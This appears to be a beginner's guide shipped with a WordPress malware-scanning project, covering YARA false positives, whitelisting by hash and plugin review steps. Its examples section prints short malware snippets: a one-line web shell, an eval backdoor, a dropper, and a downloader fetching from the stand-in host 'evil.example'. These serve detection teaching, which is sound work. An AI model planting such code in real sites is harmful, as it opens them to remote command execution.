# Security for dummies

This document is intended as a very practical, beginner-friendly guide to some of the most common security concepts that appear during WordPress malware analysis.

The goal is not to turn this project into a cybersecurity course, but to help a developer with a web background understand why some patterns are suspicious, why false positives happen, and how to think about risk in a calm and systematic way.

## Index

- [Security for dummies](#security-for-dummies)
  - [Index](#index)
  - [1) Why a WordPress site can be infected even when it looks normal](#1-why-a-wordpress-site-can-be-infected-even-when-it-looks-normal)
  - [2) Why false positives are normal in malware analysis](#2-why-false-positives-are-normal-in-malware-analysis)
  - [3) What are non-printable characters and why do they matter?](#3-what-are-non-printable-characters-and-why-do-they-matter)
  - [4) Real-world examples of dangerous non-printable characters](#4-real-world-examples-of-dangerous-non-printable-characters)
    - [Example 1: header injection](#example-1-header-injection)
    - [Example 2: NUL byte in a string](#example-2-nul-byte-in-a-string)
    - [Example 3: weird bytes hidden in uploaded files](#example-3-weird-bytes-hidden-in-uploaded-files)
    - [Example 4: bypass of filters or regex](#example-4-bypass-of-filters-or-regex)
    - [Example 5: shell or SQL confusion](#example-5-shell-or-sql-confusion)
  - [5) Why this matters in WordPress malware analysis](#5-why-this-matters-in-wordpress-malware-analysis)
  - [6) Why we limit searches to the real plugin/theme header](#6-why-we-limit-searches-to-the-real-plugintheme-header)
  - [7) Why whitelists are so important](#7-why-whitelists-are-so-important)
  - [8) The mindset to keep](#8-the-mindset-to-keep)
  - [9) Practical takeaway](#9-practical-takeaway)
  - [10) What YARA is and why it is not perfect](#10-what-yara-is-and-why-it-is-not-perfect)
  - [11) Common false positives you will see in WordPress](#11-common-false-positives-you-will-see-in-wordpress)
  - [12) Web shells and malware in WordPress](#12-web-shells-and-malware-in-wordpress)
  - [13) Examples of real malware patterns in WordPress](#13-examples-of-real-malware-patterns-in-wordpress)
    - [Example A: PHP backdoor disguised as a plugin method](#example-a-php-backdoor-disguised-as-a-plugin-method)
    - [Example B: shell execution hidden in a theme file](#example-b-shell-execution-hidden-in-a-theme-file)
    - [Example C: file write to a new PHP file](#example-c-file-write-to-a-new-php-file)
    - [Example D: downloader from a remote URL](#example-d-downloader-from-a-remote-url)
    - [Example E: encoded script hidden behind repeated concatenation](#example-e-encoded-script-hidden-behind-repeated-concatenation)
    - [Example F: recurring malicious patterns inside media or uploaded files](#example-f-recurring-malicious-patterns-inside-media-or-uploaded-files)
  - [14) How to review a suspicious plugin or theme step by step](#14-how-to-review-a-suspicious-plugin-or-theme-step-by-step)
    - [What to check before deleting a suspicious plugin](#what-to-check-before-deleting-a-suspicious-plugin)
    - [What to do when the original package is not available](#what-to-do-when-the-original-package-is-not-available)
  - [15) Hashes and whitelists](#15-hashes-and-whitelists)
    - [Rule of thumb for real-world cases](#rule-of-thumb-for-real-world-cases)
  - [16) Good practices when reviewing a site](#16-good-practices-when-reviewing-a-site)
  - [17) Final note](#17-final-note)

---

## 1) Why a WordPress site can be infected even when it looks normal

A WordPress site usually contains:

- PHP code
- JavaScript
- CSS
- plugins and themes
- database content
- uploaded files
- media files

Any of these can be modified by malware. Sometimes the malicious payload is obvious. Sometimes it is hidden in:

- compressed or encoded strings
- base64 payloads
- weird file names
- images with embedded code
- functions that look legitimate but are abused in a suspicious way

This is exactly why scanning tools must be careful. A pattern can look suspicious in one context and totally normal in another.

---

## 2) Why false positives are normal in malware analysis

A YARA rule searches for patterns. That is useful, but it has a problem: patterns are not always unique.

For example, many legitimate WordPress plugins or themes contain strings such as:

- `base64_decode`
- `eval`
- `file_get_contents`
- `curl`
- `preg_replace`
- `wp_remote_get`
- `http_build_query`

These are totally normal in regular code. But a malicious script may also use them.

So the real question is not just:

- “Does this code use `eval`?”

The real question is:

- “Is this `eval` used in a malicious or suspicious way in this specific context?”

That is why you often need:

- custom YARA rules
- custom whitelists
- site-specific exclusions
- manual review of the final matches

This project tries to reduce the noise by:

- generating whitelist hashes for official WordPress core files
- generating whitelist hashes for official plugins and themes
- only processing entries that match the YARA rules
- limiting metadata searches to the relevant header files

---

## 3) What are non-printable characters and why do they matter?

Non-printable characters are bytes that are not meant to be displayed normally in text. Examples include:

- NUL bytes (`\x00`)
- carriage returns (`\r`)
- line feeds (`\n`)
- tab characters (`\t`)
- control characters like `\x1f`, `\x7f`, `\x1b`
- malformed UTF-8 sequences

These bytes are not “bad” by themselves. The danger is when they appear where they should not, especially in:

- HTTP headers
- file contents
- script output
- uploaded files
- SQL queries
- shell commands
- configuration files

They can be used to:

- break parsing
- confuse regex or sanitizers
- hide malicious code behind a benign-looking file
- bypass simple detection rules
- alter the output of a response or a script

### Practical rule: context matters more than the byte itself

This is the part that helps most to avoid false positives.

The same control byte or unusual sequence is not equally suspicious in every file type:

- In PHP, JS, `.inc`, `.tpl`, or similar code files: a non-printable byte near a suspicious string or function call is much more relevant.
- In images, PDFs, ZIPs, or other binary media: these bytes are often normal and expected.
- In a media file, the real signal is not “there is a weird byte”, but “the file also contains executable-like content or code that can be interpreted by PHP or the browser”.

This is why a good rule is not:

- “all weird bytes are malicious”

It is instead:

- “weird bytes are suspicious when they appear in code and they are combined with code execution or obfuscation patterns”

For example, a `\x00` in a PHP file near `eval`, `base64_decode`, `preg_replace`, `system`, or a hidden payload is far more relevant than the same byte sequence inside a PNG, JPG, or other media file. In the same way, a YARA rule should not trigger on the basis of non-printables alone in every file type; it should be combined with the file being a code-like file or with nearby suspicious PHP execution patterns.

This is exactly the kind of contextual filtering that helps in projects like this one, where the goal is to reduce noise without losing real findings.

---

## 4) Real-world examples of dangerous non-printable characters

### Example 1: header injection

```php
header("Location: /login.php\r\nSet-Cookie: admin=true");
```

This is dangerous because `\r\n` is a carriage return + newline. If it reaches the HTTP response layer without validation, an attacker may inject extra headers or modify the response flow.

This is a classic response splitting / header injection vector.

### Example 2: NUL byte in a string

```php
$raw = "admin\x00";
```

A parser or function may treat this as the end of the string, or it may behave differently depending on the runtime or library used. This can confuse validation, logging, and comparisons.

### Example 3: weird bytes hidden in uploaded files

A malicious file may look like an image or text file but also contain control bytes inside the payload. A scanner may only inspect the first few bytes and miss the suspicious content later in the file.

This is one of the reasons why sanitizing image files can be useful in malware analysis: a malicious payload may be hidden in a file that looks harmless at first glance.

### Example 4: bypass of filters or regex

```php
if (preg_match('/^[a-zA-Z0-9]+$/', $user)) {
    // allow
}
```

If an attacker can smuggle a control character or a Unicode surrogate-like byte sequence, the value may appear harmless to one layer and then be interpreted differently by another part of the application.

This is a common bypass technique.

### Example 5: shell or SQL confusion

```php
$query = "SELECT * FROM users WHERE name = 'admin\x00'";
```

Depending on the database driver and the environment, these bytes may change the meaning of the query or break expectations in ways that are hard to debug.

---

## 5) Why this matters in WordPress malware analysis

WordPress plugins and themes are PHP projects running in a PHP environment. They often contain:

- loops
- strings
- concatenations
- file system access
- network calls
- dynamic evaluation
- obfuscated code

Because of that, malware not only needs to be suspicious; it also needs to be context-aware.

A piece of code can be legitimate in one file and malicious in another because:

- it is loaded in a different context
- it is executed under a different trigger
- it is combined with other strings or functions
- it is hidden behind encoding or concatenation

This is why a robust audit process usually uses:

- multiple YARA rules
- whitelist generation for trusted software
- manual inspection of suspicious paths
- checks on the file header and metadata
- validation of the plugin or theme version before trying to download the official package

---

## 6) Why we limit searches to the real plugin/theme header

This project tries to avoid false positives by looking only at the relevant metadata fields in the relevant files.

For example:

- plugin metadata usually lives in the main plugin PHP file
- theme metadata usually lives in `style.css`
- the version and name are expected near the top of that file

So we avoid scanning the whole plugin directory for `Version:` because a plugin may contain other files such as:

- `license.txt`
- HTML release logs
- translator files
- readme documents
- example data

Those files can easily contain text like:

- `Version 3, 29 June 2007`
- `Version 6.5.14 (6th January 2022)`

This is completely different from the actual WordPress plugin version in the plugin header and would become a false positive if we searched the entire directory blindly.

This is the main reason behind the method used in this project:

- scan with YARA
- take only the directories that match
- inspect the header of the plugin/theme only
- read only the beginning of the header file
- extract the real version metadata

---

## 7) Why whitelists are so important

A whitelist is a list of known-good code or hashes that helps avoid flagging legitimate files as malicious.

For a WordPress project, this is especially useful because many plugins and themes are common and may contain code patterns that resemble malware under a naive rule.

The whitelist workflow usually works like this:

1. identify the WordPress version
2. identify the plugin/theme set in use
3. download the official package from the official repository
4. generate hashes for the trusted files
5. compare those hashes against the site data
6. ignore or reduce matches that correspond to known good code

This is not a magic shield, but it is a very effective way to reduce noise and improve the quality of the review.

---

## 8) The mindset to keep

When auditing code for security, it helps to remember:

- unusual patterns are not automatically malicious
- normal code can be abused in malicious ways
- false positives are a normal part of static scanning
- context is more important than the string itself
- the safest approach is usually layered: scan, narrow, inspect, validate

Security is not about finding one magical signature. It is about understanding how code is used, where it is loaded, and how it interacts with the rest of the system.

---

## 9) Practical takeaway

For a WordPress site, the usual workflow is:

- scan the site with YARA
- identify the suspicious files and directories
- narrow the scope to the real plugin/theme root
- inspect the main metadata file only
- compare against official plugin/theme packages
- whitelist known-good files
- manually review the remaining suspicious matches

This is a pragmatic, developer-friendly way to avoid overreacting to noise while still catching actual suspicious code.

---

## 10) What YARA is and why it is not perfect

YARA is a pattern-matching engine. It looks for specific signatures or byte patterns in files. This is very useful because a malware sample often contains a repeated structure or suspicious string.

But YARA is not a semantic analyzer. It does not understand intent, context, or code execution. It only knows: “this file matches this pattern”.

That means:

- a legitimate plugin can trigger a rule
- a false positive can be caused by a common function name or a repeated string
- a malicious payload can be hidden with obfuscation or concatenation
- a signature must be tuned for the specific environment where it is used

This is why YARA is useful as a first filter, but not as a final verdict.

In WordPress contexts, YARA is best used to narrow the scope of suspicious files, not to decide greedily that a site is compromised.

---

## 11) Common false positives you will see in WordPress

Some of the most common false positives are not malicious in themselves. They appear often in legitimate code, especially in plugins and themes.

Examples include:

- `eval`
- `base64_decode`
- `file_get_contents`
- `curl`
- `file_put_contents`
- `preg_replace`
- `wp_remote_get`
- `http_build_query`
- `openssl_encrypt`
- `serialize`

These functions are normal in many WordPress sites, but they are also used by malware. The difference is usually how they are used and where they are called from.

This is why a naive rule may flag a plugin as suspicious even when the plugin is perfectly legitimate. The solution is not to delete the rule, but to refine the rule, inspect the context, and use whitelists where appropriate.

---

## 12) Web shells and malware in WordPress

A web shell is a script that allows an attacker to execute code through a web request. In WordPress, this often appears as a PHP script inserted into a plugin, theme, or a seemingly innocent file.

Typical signs include:

- suspicious PHP files outside normal plugin/theme structure
- base64-encoded or obfuscated strings
- functions like `eval`, `system`, `exec`, `shell_exec`, `passthru`, `proc_open`
- files that are not part of a known plugin or theme
- code that creates or edits other files on disk
- code that fetches external payloads

A web shell can be very small or very well hidden. It may intentionally use strange formatting or encoded strings to avoid simple detection.

This is why YARA and static analysis are only part of the process. You also need to examine the actual file content, the file path, and the surrounding context.

---

## 13) Examples of real malware patterns in WordPress

These are concrete patterns that show up very often in suspicious WordPress code. They are not automatically malicious by themselves, but each one should trigger a deeper look when it appears in an unexpected place.

### Example A: PHP backdoor disguised as a plugin method

```php
<?php
function some_plugin_callback() {
    $payload = "base64_decode('...')";
    eval($payload);
}
```

What is suspicious here:

- `eval` is a classic malware execution primitive
- the payload is hidden behind a string
- the function name may look harmless but the execution path is not

### Example B: shell execution hidden in a theme file

```php
<?php
system($_GET['cmd']);
```

This is a direct command execution pattern. Even if it is buried in a theme or plugin, it is a high-severity sign.

### Example C: file write to a new PHP file

```php
<?php
file_put_contents(__DIR__ . '/shell.php', $payload);
```

This is very suspicious because it writes a new file to disk. A malicious actor may use this technique to create a web shell or persistence mechanism.

### Example D: downloader from a remote URL

```php
<?php
$payload = file_get_contents('https://evil.example/payload.php');
file_put_contents('/tmp/loader.php', $payload);
```

This pattern usually indicates a remote loader or a beacon. Even if it is not the final payload, it is a strong sign that the site is compromised or under active attack.

### Example E: encoded script hidden behind repeated concatenation

```php
<?php
$part1 = 'bas';
$part2 = 'e64_';
$part3 = 'decode';
$code = $part1 . $part2 . $part3;
$code('...');
```

This looks weird at first glance, but it is a common obfuscation pattern. The goal is to hide the exact malicious function call from simpler scanners.

### Example F: recurring malicious patterns inside media or uploaded files

Sometimes the malicious payload is not in `.php` at all. It may be in:

- an image file
- a CSS file
- a JS file
- a JSON file
- a custom script loaded by WordPress

This is a reminder that static analysis should not focus only on obvious PHP files. Attackers sometimes hide malicious code where the site does not expect it.

---

## 14) How to review a suspicious plugin or theme step by step

When a plugin or theme triggers a YARA rule, the safest workflow is the following:

1. Identify the plugin or theme directory
2. Inspect the main metadata header file
   - plugin: usually the main PHP file
   - theme: usually `style.css`
3. Check the `Plugin Name`, `Theme Name`, and `Version` values near the top of that file
4. Compare that data with the official package from WordPress.org
5. Check whether the suspicious function calls are part of the original plugin or were injected later
6. Review the file path: is it a normal plugin file or something hidden in a random folder?
7. Check whether the suspicious pattern is isolated or appears in many unrelated files
8. Decide whether the result is a real anomaly or a false positive
9. Only then consider removing or quarantining the plugin or theme

### What to check before deleting a suspicious plugin

Before deleting anything, ask yourself:

- Is this plugin actually active in WordPress?
- Is the suspicious file the main plugin file or a random helper inside it?
- Does the plugin header match the official package version?
- Is the suspicious code present only in the plugin directory or also in other site files?
- Is the function call part of the plugin logic or clearly injected malware?
- Is the file path where it is found expected for that plugin?
- Has the plugin been modified recently or had its files changed outside WordPress?
- Does the hash of the plugin differ from the official package?

If the answer to these questions is “I do not know”, the safest course is to isolate the site, compare with the official package, and inspect the code before deleting anything.

### What to do when the original package is not available

For plugins and themes from WordPress.org, the process is usually straightforward: fetch the official package, hash it, and compare the installed files against the clean source. That is the standard workflow used by this project and by the script `scripts/generate-whitelist.sh`.

For paid, old, or third-party products, the situation is different. Sometimes the original code is simply no longer available because:

- the plugin or theme was removed from the vendor site
- the author no longer distributes the project
- the purchase was made years ago and the original package is lost
- the site was customized heavily and no clean baseline remains

In those cases, the right approach is to avoid pretending we have a perfect official reference. Instead, we do a narrower risk review:

1. inspect the plugin/theme header and compare it with any archived or vendor-owned copies
2. review timestamps, file modification dates, and suspicious changes outside the normal directory structure
3. compare with other installations or staging environments if they exist
4. look for code injected outside the expected plugin/theme structure
5. check whether the suspicious logic is part of a known feature set or looks like persistence or remote payload execution
6. if there is no trustworthy original source, prefer containment and manual investigation over aggressive deletion

This is not a failure of the workflow; it is simply a realistic limit of real-world WordPress maintenance. The project should treat official WordPress.org packages as the easy case, and paid or legacy third-party products as the harder case that requires more evidence before acting.

This is exactly where the whitelist workflow helps a lot: it gives you a baseline of known-good content and helps you distinguish the real issue from harmless noise.

---

## 15) Hashes and whitelists

A hash is a unique fingerprint of a file. If you generate a hash for a trusted file, you can later compare future versions against it.

This helps because:

- the official WordPress core files are known
- official plugins and themes can be downloaded and hashed
- if a file still matches the official hash, it is likely unchanged
- if it differs, it may have been modified or injected

This is the idea behind the whitelist workflow used in this project:

- download the official package
- hash the expected files
- compare them against the site files
- ignore the known-good ones that are part of the original software

This is especially effective for plugins and themes published in the official WordPress.org repository, because their original package is usually easy to fetch and compare.

The important nuance is that this does not always work for every plugin or theme:

- paid plugins or themes may not be easy to source again
- old third-party products may have been removed from their original vendor site
- discontinued commercial items may no longer have a public package to compare against
- some legacy sites may have custom modifications layered on top of a base package

In those cases, the whitelist approach becomes a risk-based comparison instead of a perfect “download and match the official file” workflow. The practical goal is still the same: establish a known-good baseline whenever possible and document what cannot be validated directly.

### Rule of thumb for real-world cases

- If it is from WordPress.org: fetch the official package, generate hashes, and compare it with the installed files.
- If it is paid, old, or third-party and the source is missing: do not assume the package is clean just because it “looks normal”; inspect the code, compare timestamps, review unexpected files, and isolate until you have evidence.
- If there is no trustworthy original version at all: prefer containment, backups, and careful manual review over deleting something on a hunch.

This significantly reduces noise and keeps the investigation focused on files that are actually unusual.

---

## 16) Good practices when reviewing a site

A few common rules help keep the process sane and reliable:

- work on a backup or a copy of the site whenever possible
- do not trust a single YARA match as proof of malware
- do not assume every `eval` or `base64_decode` is malicious
- check the file path and plugin/theme context before deciding
- compare suspicious files with the official package
- keep custom rules and whitelists site-specific
- review results in small, controlled batches

Security auditing is usually a layered process, not a single magical check. The goal is to reduce noise, build confidence, and focus attention where it matters.

---

## 17) Final note

This project is intentionally aimed at people who are not cybersecurity experts but who need a practical tool to review a WordPress site with a bit more clarity.

It is not a full forensic suite, and it is not a substitute for professional review in high-risk environments. But it can still be very useful as a helper to narrow down suspicious patterns and focus the investigation on the right places.
